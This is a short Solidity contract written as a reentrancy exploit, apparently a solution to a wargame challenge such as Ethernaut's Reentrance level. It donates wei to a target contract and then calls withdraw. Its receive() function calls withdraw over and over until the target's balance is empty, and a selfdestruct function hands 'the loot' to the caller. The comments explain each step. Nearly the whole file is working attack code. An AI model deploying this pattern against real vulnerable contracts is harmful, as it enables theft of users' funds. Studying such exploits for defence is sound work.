//SPDX-License-Identifier: UNLIENSED
pragma solidity ^0.8.0;

interface IReentrance{
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract GxT{
   // IReentrance reen;
    address instance;

    constructor(address _a) payable {
    instance =_a;
    }

    function attack() public {
        //in the attack function I donate an amout of wei to set my balance inside the target contract
        //then I call withdraw
        IReentrance(instance).donate{value: 1e15}(address(this));
        IReentrance(instance).withdraw(1e15);
        
    }

    receive()external payable{
        //in the call() inside the withdraw fct the calldata is null => receive fct will be triggered
        //when the receive() is triggered it initiates another withdraw
        //this will run recursively until all the funds are stolen
        uint amount = instance.balance>1e15 ? 1e15 : instance.balance;
        if(instance.balance>0) 
            IReentrance(instance).withdraw(amount);
    }

    //the fct used to claim the loot
    function self()public { selfdestruct(payable(msg.sender));}

}
